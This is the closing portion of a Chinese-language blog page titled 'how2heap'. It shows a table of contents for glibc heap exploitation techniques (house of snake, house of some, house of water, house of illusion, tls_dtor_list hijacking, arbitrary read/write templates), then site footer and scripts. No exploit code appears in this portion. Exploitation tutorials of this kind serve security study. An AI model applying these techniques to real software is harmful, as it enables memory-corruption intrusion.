husk</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-18"><span class="toc-number">19.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-18"><span class="toc-number">19.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-8"><span class="toc-number">19.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-8"><span class="toc-number">19.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-snake"><span class="toc-number">20.</span> <span class="toc-text">house of snake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-19"><span class="toc-number">20.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-19"><span class="toc-number">20.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6"><span class="toc-number">20.2.1.</span> <span class="toc-text">绕过条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">20.2.2.</span> <span class="toc-text">函数调用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">20.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%881"><span class="toc-number">20.3.1.</span> <span class="toc-text">模板方案1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%882"><span class="toc-number">20.3.2.</span> <span class="toc-text">模板方案2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-snake2"><span class="toc-number">21.</span> <span class="toc-text">house of snake2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-20"><span class="toc-number">21.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-20"><span class="toc-number">21.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">21.2.1.</span> <span class="toc-text">绕过条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">21.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%881-1"><span class="toc-number">21.3.1.</span> <span class="toc-text">模板方案1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%882-1"><span class="toc-number">21.3.2.</span> <span class="toc-text">模板方案2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%883"><span class="toc-number">21.3.3.</span> <span class="toc-text">模板方案3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81tls-dtor-list-%E5%88%A9%E7%94%A8-call-tls-dtors%E6%8B%BF%E5%88%B0%E6%9D%83%E9%99%90"><span class="toc-number">22.</span> <span class="toc-text">劫持tls_dtor_list,利用__call_tls_dtors拿到权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-21"><span class="toc-number">22.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-21"><span class="toc-number">22.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-some"><span class="toc-number">23.</span> <span class="toc-text">house of some</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-22"><span class="toc-number">23.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-22"><span class="toc-number">23.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-number">23.2.1.</span> <span class="toc-text">任意写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-apple2%E5%85%B6%E4%B8%AD%E6%9C%89%E4%B8%80%E6%9D%A1%E9%93%BE%E6%98%AF%E5%A6%82%E4%B8%8B%E8%BF%9B%E8%A1%8C%E7%9A%84"><span class="toc-number">23.2.2.</span> <span class="toc-text">House of apple2其中有一条链是如下进行的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB"><span class="toc-number">23.2.3.</span> <span class="toc-text">任意读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-number">23.2.4.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-some2"><span class="toc-number">24.</span> <span class="toc-text">house of some2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-23"><span class="toc-number">24.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-23"><span class="toc-number">24.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%8C%9C%E6%83%B3"><span class="toc-number">24.2.1.</span> <span class="toc-text">第一次猜想</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdx%E7%9A%84%E6%8E%A7%E5%88%B6"><span class="toc-number">24.2.2.</span> <span class="toc-text">rdx的控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0%E8%B5%B7%E7%82%B9"><span class="toc-number">24.2.3.</span> <span class="toc-text">回到起点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E9%AB%98%E6%89%8B%EF%BC%9FCanary"><span class="toc-number">24.2.4.</span> <span class="toc-text">还有高手？Canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF-1"><span class="toc-number">24.3.</span> <span class="toc-text">模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-water"><span class="toc-number">25.</span> <span class="toc-text">house of water</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-24"><span class="toc-number">25.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-24"><span class="toc-number">25.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo"><span class="toc-number">25.2.1.</span> <span class="toc-text">demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-illusion"><span class="toc-number">26.</span> <span class="toc-text">house of illusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-25"><span class="toc-number">26.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-25"><span class="toc-number">26.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99-1"><span class="toc-number">26.2.1.</span> <span class="toc-text">任意写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB-1"><span class="toc-number">26.2.2.</span> <span class="toc-text">任意读</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/49295/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/49295/&text=how2heap"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/49295/&is_video=false&description=how2heap"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=how2heap&body=Check out this article: https://ixout.github.io/posts/49295/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/49295/&name=how2heap&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/49295/&t=how2heap"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>
        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    ixout
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
